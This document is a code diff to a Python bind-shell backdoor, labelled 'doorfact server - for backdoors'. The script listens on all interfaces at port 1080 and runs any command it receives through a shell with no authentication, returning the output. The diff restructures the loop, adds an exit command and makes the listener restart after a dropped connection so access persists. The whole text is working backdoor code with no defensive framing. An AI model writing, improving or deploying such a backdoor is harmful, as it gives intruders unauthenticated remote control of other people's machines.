@@ -34,10 +34,12 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 
 import socket
 import subprocess
+import sys
 
 print("doorfact server - for backdoors")
 
 # Verbosely  - just for debugging
+
 
 try:
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -47,6 +49,7 @@ except Exception:
 
 address = "0.0.0.0"
 port = 1080
+
 try:
 	s.bind((address, port))
 	print(f"Bind successful - on {address}:{port}")
@@ -61,15 +64,41 @@ except:
 
 welcome_msg = "Welcome. You are connected to the bind shell. "
 
-conn, address = s.accept()
-print(f"You are connect with: {address}")
-conn.sendall(welcome_msg.encode())
+#conn, address = s.accept()
+#print(f"You are connect with: {address}")
+#conn.sendall(welcome_msg.encode())
 
-while True: 
-	recv_command = conn.recv(2048) # Command must be < 2048 char
-	print(f"$ {recv_command.decode()}")
-	call = subprocess.run(recv_command.decode(), shell=True, capture_output=True)
-	output = call.stdout.decode()
-	error = call.stderr.decode()
-	realoutput = f"{output} {error}"
-	conn.sendall(realoutput.encode())
+def main():
+	conn, r_addr = s.accept()
+	print(f"You are connected with {r_addr}")
+	conn.sendall(welcome_msg.encode())
+
+	try:
+		while True: 
+			recv_command = conn.recv(2048) # Command must be < 2048 char
+			print(f"$ {recv_command.decode()}") # debug purpose
+
+			if recv_command.decode().lower() == "exit":
+				conn.sendall("sesclosed".encode())
+				print("Session closed by exit command. Exiting...")
+				sys.exit(0)
+
+			call = subprocess.run(recv_command.decode(), shell=True, capture_output=True) # call the command and capture the output
+			output = call.stdout.decode()
+			error = call.stderr.decode()
+
+			realoutput = f"{output} {error}"
+
+			# both stdout and stderr must be sent
+
+			conn.sendall(realoutput.encode())
+
+	except BrokenPipeError:
+		print("Broken pipe")
+		print("Session closed - relistening...")
+		#s.bind((address, port))
+		s.listen(5)
+		main()
+
+if __name__ == "__main__":
+	main()
